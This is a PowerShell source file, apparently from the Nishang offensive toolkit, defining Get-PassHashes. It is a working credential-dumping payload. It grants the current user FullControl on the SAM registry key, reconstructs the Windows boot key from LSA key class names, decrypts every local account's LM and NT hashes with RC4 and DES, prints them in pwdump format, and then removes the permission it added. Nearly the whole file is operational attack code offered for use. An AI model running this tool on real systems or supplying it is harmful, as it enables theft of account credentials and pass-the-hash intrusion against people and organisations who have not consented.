function Get-PassHashes { 
<# 
.SYNOPSIS 
Nishang payload which dumps password hashes. 
 
.DESCRIPTION 
The payload dumps password hashes using the modified powerdump script from MSF. Administrator privileges are required for this script
(but not SYSTEM privs as for the original powerdump written by David Kennedy)

.EXAMPLE 
PS > Get-PassHashes
Run above from an elevated shell.


.EXAMPLE 
PS > Get-PassHashes -PSObjectFormat
Use above to receive the hashes output as a PSObject.
 
.LINK 
http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
https://github.com/samratashok/nishang

.Notes
Reflection added by https://github.com/Zer1t0

#> 
[CmdletBinding()]
Param (
    [Switch]$PSObjectFormat
)

$script:PowerDump = $null
function LoadApi
{
    # https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/27/use-powershell-to-interact-with-the-windows-api-part-3/
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
    $TypeBuilder = $ModuleBuilder.DefineType('PowerDump', 'Public, Class')

    #######################################################################
    # [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
    # public static extern int RegOpenKeyEx(int hKey, string subKey, int ulOptions, int samDesired, out int hkResult);
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegOpenKeyEx',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int], [string], [int], [int], [int].MakeByRefType())
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
    )
    $FieldValueArray = [Object[]] @(
        'RegOpenKeyEx',
        [Runtime.InteropServices.CharSet]::Auto
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    ##########################################################################
    #[DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    #extern public static int RegQueryInfoKey(int hkey, StringBuilder lpClass, ref int lpcbClass, int lpReserved, out int lpcSubKeys, out int lpcbMaxSubKeyLen, out int lpcbMaxClassLen, out int lpcValues, out int lpcbMaxValueNameLen, out int lpcbMaxValueLen, out int lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegQueryInfoKey',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int], [Text.Stringbuilder], [int].MakeByRefType(), [int], [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [IntPtr])
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    )
    $FieldValueArray = [Object[]] @(
        'RegQueryInfoKey',
        [Runtime.InteropServices.CallingConvention]::Winapi,
        $true
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    ###############################################################################
    #[DllImport("advapi32.dll", SetLastError=true)]
    #public static extern int RegCloseKey(int hKey);
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegCloseKey',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int])
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    )
    $FieldValueArray = [Object[]] @(
        'RegCloseKey',
        $true
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    ################################################################################
    
    $script:PowerDump = $TypeBuilder.CreateType()
}

#######################################powerdump written by David Kennedy#########################################

$antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
$almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
$empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
$empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
$odd_parity = @(
  1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
  16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
  32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
  49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
  64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
  81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
  97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
);

function sid_to_key($sid)
{
    $c0 = $sid -band 255
    $c1 = ($sid -band 65280)/256
    $c2 = ($sid -band 16711680)/65536
    $c3 = ($sid -band 4278190080)/16777216

    $s1 = @($c0, $c1, $c2, $c3, $c0, $c1, $c2)
    $s2 = @($c3, $c0, $c1, $c2, $c3, $c0, $c1) 

    return ,((str_to_key $s1),(str_to_key $s2))
}

function str_to_key($s)
{
    $k0 = [int][math]::Floor($s[0] * 0.5)
    $k1 = ( $($s[0] -band 0x01) * 64) -bor [int][math]::Floor($s[1] * 0.25)
    $k2 = ( $($s[1] -band 0x03) * 32) -bor [int][math]::Floor($s[2] * 0.125)
    $k3 = ( $($s[2] -band 0x07) * 16) -bor [int][math]::Floor($s[3] * 0.0625)
    $k4 = ( $($s[3] -band 0x0F) * 8) -bor [int][math]::Floor($s[4] * 0.03125)
    $k5 = ( $($s[4] -band 0x1F) * 4) -bor [int][math]::Floor($s[5] * 0.015625)
    $k6 = ( $($s[5] -band 0x3F) * 2) -bor [int][math]::Floor($s[6] * 0.0078125)
    $k7 = $($s[6] -band 0x7F)

    $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7)

    0..7 | %{
        $key[$_] = $odd_parity[($key[$_] * 2)]
    }

    return ,$key
}

function NewRC4([byte[]]$key)
{
    return new-object Object |
    Add-Member NoteProperty key $key -PassThru |
    Add-Member NoteProperty S $null -PassThru |
    Add-Member ScriptMethod init {
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
        }
    } -PassThru |
    Add-Member ScriptMethod "encrypt" {
        $data = $args[0];
        $this.init();
        $outbuf = new-object byte[] $($data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        }
        return ,$outbuf;
    } -PassThru
}

function des_encrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $true)
}

function des_decrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $false)
}

function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
{
    $des = new-object Security.Cryptography.DESCryptoServiceProvider;
    $des.Mode = [Security.Cryptography.CipherMode]::ECB;
    $des.Padding = [Security.Cryptography.PaddingMode]::None;
    $des.Key = $key;
    $des.IV = $key;
    $transform = $null;
    if ($doEncrypt) {$transform = $des.CreateEncryptor();}
    else{$transform = $des.CreateDecryptor();}
    $result = $transform.TransformFinalBlock($data, 0, $data.Length);
    return ,$result;
}

function Get-RegKeyClass([string]$key, [string]$subkey)
{
    switch ($Key) {
        "HKCR" { $nKey = 0x80000000} #HK Classes Root
        "HKCU" { $nKey = 0x80000001} #HK Current User
        "HKLM" { $nKey = 0x80000002} #HK Local Machine
        "HKU"  { $nKey = 0x80000003} #HK Users
        "HKCC" { $nKey = 0x80000005} #HK Current Config
        default {
            throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
        }
    }
    $KEYQUERYVALUE = 0x1;
    $KEYREAD = 0x19;
    $KEYALLACCESS = 0x3F;
    $result = "";
    [int]$hkey=0
    if (-not $script:PowerDump::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
    {
    	$classVal = New-Object Text.Stringbuilder 1024
    	[int]$len = 1024
    	if (-not $script:PowerDump::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
    		[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
    	{
    		$result = $classVal.ToString()
    	}
    	else
    	{
    		Write-Error "RegQueryInfoKey failed";
    	}
    	$script:PowerDump::RegCloseKey($hkey) | Out-Null
    }
    else
    {
    	Write-Error "Cannot open key";
    }
    return $result;
}

function Get-BootKey
{
    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
    $b = new-object byte[] $($s.Length/2);
    0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
    $b2 = new-object byte[] 16;
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
    return ,$b2;
}

function Get-HBootKey
{
    param([byte[]]$bootkey);
    $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
    $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
    $k = Get-Item HKLM:\SAM\SAM\Domains\Account;
    if (-not $k) {return $null}
    [byte[]]$F = $k.GetValue("F");
    if (-not $F) {return $null}
    $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
    $rc4 = NewRC4 $rc4key;
    return ,($rc4.encrypt($F[0x80..0x9F]));
}

function Get-UserName([byte[]]$V)
{
    if (-not $V) {return $null};
    $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
    $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
    return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
}

function Get-UserHashes($u, [byte[]]$hbootkey)
{
    [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
    
    # check if hashes exist (if byte memory equals to 20, then we've got a hash)
    $LM_exists = $false;
    $NT_exists = $false;
    # LM header check
    if ($u.V[0xa0..0xa3] -eq 20)
    {
        $LM_exists = $true;
    }
    # NT header check
    elseif ($u.V[0xac..0xaf] -eq 20)
    {
        $NT_exists = $true;
    }

    if ($LM_exists -eq $true)
    {
        $lm_hash_offset = $u.HashOffset + 4;
        $nt_hash_offset = $u.HashOffset + 8 + 0x10;
        $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
        $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
	
    elseif ($NT_exists -eq $true)
    {
        $nt_hash_offset = $u.HashOffset + 8;
        $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
}

function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
{
    [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
    # LM Hash
    if ($enc_lm_hash)
    {
        $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
    }

    # NT Hash
    if ($enc_nt_hash)
    {
        $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
    }

    return ,($lmhash,$nthash)
}

function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
{
    $deskeys = sid_to_key $rid;
    $md5 = [Security.Cryptography.MD5]::Create();
    $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
    $rc4 = NewRC4 $rc4_key;
    $obfkey = $rc4.encrypt($enc_hash);
    $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
        (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
    return ,$hash;
}

function Get-UserKeys
{
    ls HKLM:\SAM\SAM\Domains\Account\Users |
        where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
            Add-Member AliasProperty KeyName PSChildName -PassThru |
            Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
            Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
}

function DumpHashes
{
    LoadApi
    $bootkey = Get-BootKey;
    $hbootKey = Get-HBootKey $bootkey;
    Get-UserKeys | %{
        $hashes = Get-UserHashes $_ $hBootKey;
        if($PSObjectFormat)
        {
            $creds = New-Object psobject
            $creds | Add-Member -MemberType NoteProperty -Name Name -Value $_.Username
            $creds | Add-Member -MemberType NoteProperty -Name id -Value $_.Rid
            $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-","").ToLower()
            $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-","").ToLower()
            $creds
        }
        else
        {
            "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
        }
    }
}

    #http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {
        Write-Warning "Script requires elevated or administrative privileges."
        Return
    } 
    else
    {
        #Set permissions for the current user.
        $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
        [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
        "FullControl",
        [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
        [System.Security.AccessControl.PropagationFlags]"None",
        [System.Security.AccessControl.AccessControlType]"Allow")
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
        "SAM\SAM\Domains",
        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
        [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        $acl = $key.GetAccessControl()
        $acl.SetAccessRule($rule)
        $key.SetAccessControl($acl)

        DumpHashes

        #Remove the permissions added above.
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
        Set-Acl HKLM:\SAM\SAM\Domains $acl

    }
}


